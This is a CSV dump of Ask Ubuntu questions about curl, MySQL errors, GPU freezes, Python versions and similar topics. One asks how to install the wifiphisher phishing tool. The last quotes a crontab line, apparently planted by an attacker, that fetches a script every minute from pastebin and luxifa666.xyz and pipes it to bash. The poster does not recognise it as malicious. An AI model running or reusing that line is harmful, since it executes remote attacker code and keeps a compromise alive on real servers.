Id,Title,Body,Tags,CreationDate
"1133161","What's the command same as copy as curl in chrome browser","<p>I created a script to routinely download page from my carrier website this will gather my remaining internet quota. </p>

<p>I use copy as curl feature from chrome browser, paste them to my script, it works.</p>

<p>But when i run them like 1 hour later it not working. I suspect this is because the cookies expired, is there any terminal command to get curl request exactly same as copy as curl from chrome?</p>

<p>This is my curl command:</p>

<pre><code>curl 'https://my.smartfren.com/mysmartfren_home' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/72.0.3626.121 Chrome/72.0.3626.121 Safari/537.36' \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' \
    -H 'Accept-Language: en-US,en;q=0.5' \
    --compressed \
    -H 'Referer: https://my.smartfren.com/mysmartfren_login' \
    -H 'Connection: keep-alive' \
    -H 'Cookies:' \
    -H 'Upgrade-Insecure-Requests: 1' \
    -H 'Cache-Control: max-age=0' \
    &amp;&gt; /dev/stdout \
    | tee -a $LOG
</code></pre>

<p>i removed cookies here bcs of security</p>
","<command-line><google-chrome><curl>","2019-04-12 02:14:12"
"974087","How to execute a program when a specific string is entered in a specific window?","<p>I want to write a shell script to automate screenshots using the screenshot program Shutter when some key words are written in a certain app,such as a internet chat room or text messenger service or things like that.</p>

<p>Essentially, when a specific string is input, such as "" its a beautiful day "", I want to be able for my shell script to screenshot that specific phrase ( and not just the whole screen in general ) and then paste the screenshot to a folder.</p>

<p>How would I go about writing this script, automating it, and using Shutter in my script?</p>
","<bash><scripts><automation><shutter>","2017-11-08 00:22:37"
"1052511","uniq treats lines as if they were different but they are ostensibly the same","<p>I created and edited a file with vi called sort.txt which looks like this:</p>

<pre><code>sentence one 
sentence two
sentence one
sentence three
sentence two
sentence two
sentence three
sentence one
sentence two
sentence one
sentence one
sentence one
sentence three
sentence four
sentence five
</code></pre>

<p>When I do <code>sort sort.txt | uniq -c</code>   I get this:</p>

<pre><code>  1 sentence five
  1 sentence four
  5 sentence one
  1 sentence one 
  3 sentence three
  4 sentence two
</code></pre>

<p>In addition, when I write <code>sort sort.txt | uniq -u</code>, ""sentence one"" also appears there.
I don't understand why ""sentence one"" appears twice as if the content were different, could someone explain why?</p>
","<command-line><text-processing><uniq>","2018-07-05 20:39:37"
"1202964","<MOKManager> Replace MOK with the name of the file you want for the key","<p>The site:<br>
<a href=""https://kb.vmware.com/s/article/2146460"" rel=""nofollow noreferrer"">https://kb.vmware.com/s/article/2146460</a><br>
says:<br>
""Replace MOK with the name of the file you want for the key.""<br>
With what should I replace the word ""MOK""?<br>
Can I have some examples?</p>
","<vmware>","2020-01-14 18:05:31"
"817936","How to fix this mysql error in ubuntu 16.04 LTS?","<pre><code>Setting up mysql-server-5.7 (5.7.13-0ubuntu0.16.04.2) ...
debconf: unable to initialize frontend: Dialog
debconf: (Dialog frontend requires a screen at least 13 lines tall and 31 columns wide.)
debconf: falling back to frontend: Readline
update-alternatives: error: alternative path /etc/mysql/mysql.cnf doesn't exist
dpkg: error processing package mysql-server-5.7 (--configure):
 subprocess installed post-installation script returned error exit status 2
dpkg: dependency problems prevent configuration of mysql-server:
 mysql-server depends on mysql-server-5.7; however:
  Package mysql-server-5.7 is not configured yet.

dpkg: error processing package mysql-server (--configure):
 dependency problems - leaving unconfigured
No apport report written because the error message indicates its a followup error from a previous failure.
                          Errors were encountered while processing:
 mysql-server-5.7
 mysql-server
E: Sub-process /usr/bin/dpkg returned an error code (1)
</code></pre>

<p>How can I fix this error?</p>
","<server><apt><dpkg><mysql>","2016-08-28 19:56:48"
"1052570","How do I install Diskdigger on ubuntu?","<p>DiskDigger is not in Ubuntu software. How do I install this?</p>
","<software-installation>","2018-07-06 04:14:42"
"1133425","How to I change the extension of a .txt file?","<p>I have a .txt file but i need a .bat or .sh file, but i am new and do not know what to do. I have tried a couple of things, but none have worked so far. Any help?</p>
","<rename>","2019-04-13 00:26:29"
"1203046","New Build Freezing","<p>I just fired up my new PC build with the latest Ubuntu. It'll run great for about 5 minutes and then the mouse will freeze and I have to do a hard shut down. No keyboard commands will work. What's happening? Is this a driver issue?  </p>

<p>EDIT  </p>

<p>I think my gpu driver was causing problems. 
I changed the settings to use the propriatary nvidia driver. Is this correct? It hasn't happened in the last 24 hours.</p>

<p>Here is a screen shot of $ dpkg -l <em>nvidia</em><br>
<a href=""https://paste.ubuntu.com/p/xp36x4CjvM/"" rel=""nofollow noreferrer"">https://paste.ubuntu.com/p/xp36x4CjvM/</a></p>
","<freeze>","2020-01-15 01:47:02"
"818159","Installation problem regarding wifiphisher","<p>Can anyone tell me how to install wifiphisher on ubuntu 14.04?</p>

<p>When i clone the code from github an then on typing <code>cd wifiphisher</code> in terminal and then typing <code>ls -l</code> in terminal i am not able to find the file <code>wifiphisher.py</code> which is necessary for installation</p>
","<software-installation><python>","2016-08-29 10:27:06"
"1052860","When I try to install mysql-server I get an error telling me i need mysql-community-server","<p>When I run:</p>

<pre><code>sudo apt -i install mysql-server
</code></pre>

<p>I get an error telling me there is an unmet dependency for: 'mysql-community-server is missing'</p>

<p>I tried this solution from a similar question but it did not work:</p>

<pre><code>sudo apt purge mysql-community-server
sudo apt-get autoclean &amp;&amp; sudo apt-get clean &amp;&amp; sudo apt-get update &amp;&amp; sudo apt-get upgrade &amp;&amp; sudo apt-get install mysql-server""
</code></pre>

<p>How do I get this to install?</p>

<p>I am using MySQL 5.7 and Ubuntu 18.04</p>
","<package-management><mysql>","2018-07-07 01:46:47"
"1203237","Compaq Ubuntu Presario CQ57 how do i do a hard reset","<p>I tried to change my user password but it said it does not exist so I wanted to do a hard reset making it brand new but how. The last time it was used was /2014, Denver co. delete everything and restart new is what I mean as hard restart</p>
","<compaq><presario>","2020-01-15 18:47:25"
"893251","amdgpu-pro - Stuck on login screen / Ubuntu on HP Probook 470 G3","<p>I recently installed Ubuntu on my HP Probook 470 G3</p>

<p>Everything works fine, except the system often freezes, giving messages with <code>amdgpu...</code> so i decided to install AMD's <code>amdgpu-pro</code> driver. Sadly, using that driver, i'm not even able to login anymore. Trying to log in, the screen just turns black and a little later the login screen comes up again.</p>

<p>I uninstalled the driver using <code>amdgpu-pro-uninstall</code>. But that doesn't solve the problem with the freezing.</p>

<p>Is there anyone running Ubuntu on a HP Probook 470 G3, who got rid of the freezes?</p>

<hr>

<h2>System Information</h2>

<ul>
<li>HP Probook 470 G3</li>
<li>AMD Radeon R7 M340 (1 or 2 GB DDR3 dedicated, switchable)</li>
<li>Ubuntu 16.04</li>
</ul>

<p>The mentioned <code>amdgpu-pro</code> driver was: amdgpu-pro 16.60 for Ubuntu 16.04</p>

<hr>

<h2>Some additional notes:</h2>

<ul>
<li><p>I think getting the <code>amdgpu-pro</code> driver to work could solve the problem, as the freezes seem to be related to the graphics card power management. The notebook uses a hybrid graphics system and the crashes always seem to occure when the cards switch (for example it always crashes on logout or when you attach / detach a secondary monitor)</p></li>
<li><p>Using the <code>amdgpu-pro</code> driver and starting the session with <code>startx</code> command instead of using <code>lightdm</code> service directly, i found some errors in <code>Xorg.0.log</code> that match with the errors mentioned in <a href=""https://askubuntu.com/questions/860788/undefined-symbol-is64bitelf"">this thread</a>, which sadly wasn't ever answered.</p>

<pre><code>[    46.106] (EE) AIGLX error: dlopen of /usr/lib/x86_64-linux-gnu/dri/i965_dri.so failed (/usr/lib/x86_64-linux-gnu/dri/i965_dri.so: undefined symbol: is64bitelf)
[    46.106] (EE) AIGLX: reverting to software rendering
[    46.118] (EE) AIGLX error: dlopen of /usr/lib/x86_64-linux-gnu/dri/swrast_dri.so failed (/usr/lib/x86_64-linux-gnu/dri/swrast_dri.so: undefined symbol: is64bitelf)
[    46.118] (EE) GLX: could not load software renderer
</code></pre>

<p>maybe just somehow adding the missing reference to <code>is64bitelf</code> would solve the problem?</p></li>
<li>Already tried the following drivers: Default <code>Xorg</code> driver delivered with Ubuntu, the mentioned <code>amdgpu-pro</code> driver by AMD and Obiaf's Xorg optimizations (this one resulted in black window borders and context menus)</li>
</ul>

<hr>

<p>Any help would be appreciated!</p>

<hr>

<h2>Edit:</h2>

<p>Output of <code>dmesg</code>:</p>

<pre><code>    [drm] PCIE GART of 2048M enabled (table at 0x0000000000040000).
    can't get the mac of 5
    [drm] ring test on 0 succeeded in 12 usecs
    [drm] ring test on 1 succeeded in 13 usecs
    [drm] ring test on 2 succeeded in 15 usecs
    [drm] ring test on 3 succeeded in 5 usecs
    [drm] ring test on 4 succeeded in 5 usecs
    [drm] ring test on 5 succeeded in 6 usecs
    [drm] ring test on 6 succeeded in 5 usecs
    [drm] ring test on 7 succeeded in 5 usecs
    [drm] ring test on 8 succeeded in 5 usecs
    [drm] ring test on 3 succeeded in 4 usecs
    [drm] ring test on 10 succeeded in 4 usecs
    VI should always have 2 performance levels
    amdgpu 0000:01:00.0: GPU pci config reset
</code></pre>
","<drivers><graphics><hp><amd-graphics>","2017-03-15 12:19:18"
"1133685","Why am i getting two different answers about which version of Python 3 do i have installed on Ubuntu 18?","<p>If i type ""python3.7 --version"" into terminal: result is: Python 3.7.3
If i type ""/usr/bin/python3 -V"" into terminal: result is: Python 3.6.7
Since this entry i installed pip and then ran ""python --version"" as advised by <a href=""https://packaging.python.org/tutorials/installing-packages/#ensure-you-can-run-python-from-the-command-line"" rel=""nofollow noreferrer"">https://packaging.python.org/tutorials/installing-packages/#ensure-you-can-run-python-from-the-command-line</a>
result now is  Python 2.7.15rc1
I am trying to learn Python from scratch.  I am using Visual Studio Code and i have run into a problem.  When i run terminal in Visual Studio Code; which version of Python will it be using?</p>
","<command-line><python3>","2019-04-14 00:34:13"
"893309","Deleting linux swap","<p>I deleted <code>linux swap</code> on my disk.</p>

<p>After removing <code>swap</code>, pc is starting up slowly. </p>

<p>Does lack of <code>Linux swap</code> can cause it? </p>
","<gnome><swap>","2017-03-15 15:05:02"
"1052944","does ubuntu 18.04 comes with xrdp?","<p>Hello Ubuntu Community,</p>

<blockquote>
  <p>I am looking to control my Ubuntu machine with a windows pc from work.</p>
</blockquote>
","<18.04><remote-access><xrdp>","2018-07-07 09:57:59"
"1203339","No crontab for ubuntu","<p>When i login to the terminal of ubuntu server 18.04 (EC2), i get like this </p>

<pre><code>Usage:
 kill [options] &lt;pid&gt; [...]

Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
                        specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table

 -h, --help     display this help and exit
 -V, --version  output version information and exit

For more details see kill(1).

Usage:
 kill [options] &lt;pid&gt; [...]

Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
                        specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table

 -h, --help     display this help and exit
 -V, --version  output version information and exit

For more details see kill(1).

Usage:
 kill [options] &lt;pid&gt; [...]

Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
                        specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table

 -h, --help     display this help and exit
 -V, --version  output version information and exit

For more details see kill(1).

Usage:
 kill [options] &lt;pid&gt; [...]

Options:
 &lt;pid&gt; [...]            send signal to every &lt;pid&gt; listed
 -&lt;signal&gt;, -s, --signal &lt;signal&gt;
                        specify the &lt;signal&gt; to be sent
 -l, --list=[&lt;signal&gt;]  list all signal names, or convert one to a name
 -L, --table            list all signal names in a nice table

 -h, --help     display this help and exit
 -V, --version  output version information and exit

For more details see kill(1).
no crontab for ubuntu
no crontab for ubuntu
</code></pre>

<p>By looking at few forums i thought that the crontab file for user ""ubuntu"" was empty but when i used 
**crontab -l ** , I got this</p>

<pre><code>*/1 * * * * (curl -fsSL https://pastebin.com/raw/BLPNmuQw||wget -q -O- https://pastebin.com/raw/BLPNmuQw||curl -fsSL https://pastebin.com/raw/t92Qw9LP||wget -q -O - https://pastebin.com/raw/t92Qw9LP||python -c 'import urllib2 as fbi;print fbi.urlopen(""https://pastebin.com/raw/BLPNmuQw"").read()'||curl -fsSLk luxifa666.xyz:9080/host-manager/java.txt -m 90||wget -q -O - luxifa666.xyz:9080/host-manager/java.txt --no-check-certificate -t 2 -T 60)|bash &gt; /dev/null 2&gt;&amp;1
</code></pre>

<p>Based on my research it should work. and I haven't made any modifications to this file. What am i missing here  ?</p>
","<18.04><server><cron>","2020-01-16 06:47:27"
